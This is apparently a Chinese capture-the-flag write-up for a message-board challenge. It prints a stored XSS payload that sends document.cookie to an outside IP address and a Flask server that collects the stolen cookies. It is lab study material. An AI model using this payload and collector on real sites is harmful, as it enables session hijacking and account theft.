### 35、留言板

插入图片，靶场会自动发出GET请求，可以将Cookie发送到自己的服务器，并不需要XSS平台

```
<script>location.href="http://144.34.162.13:8081/?flag_cookie="+document.cookie</script>
```

![](/notes-assets/57c981988b355619675b.webp)

然后自己的服务器就能接收到Cookie了：

![](/notes-assets/0ee941c075e5b16b8003.webp)

服务器上接收Cookie的代码如下：

```
from flask import Flask, request, jsonify



app = Flask(__name__)



@app.route('/', methods=['GET'])

def print_flag_cookie():

    # 从请求中获取名为'flag_cookie'的查询参数

    flag_cookie = request.args.get('flag_cookie')

    

    if flag_cookie:

        # 打印接收到的flag_cookie值

        print(f"Received flag_cookie: {flag_cookie}")

        

        # 返回响应给客户端

        return jsonify({"message": "Flag cookie received and printed", "flag_cookie": flag_cookie})

    else:

        # 如果没有提供flag_cookie，则返回错误信息

        return jsonify({"error": "No flag_cookie provided"}), 400



if __name__ == '__main__':

    # 运行Flask应用

    app.run(debug=True,host='0.0.0.0', port=8081)
```

盲注脚本需要把新构造的表达式赋给 payload，否则后续请求仍可能使用旧值。

入口和影响之间隔得远时，单看一处过滤很容易误判。把存储、读取和解释几步连起来，才能看出题目怎样把一个看似普通的输入带到了不该去的位置。
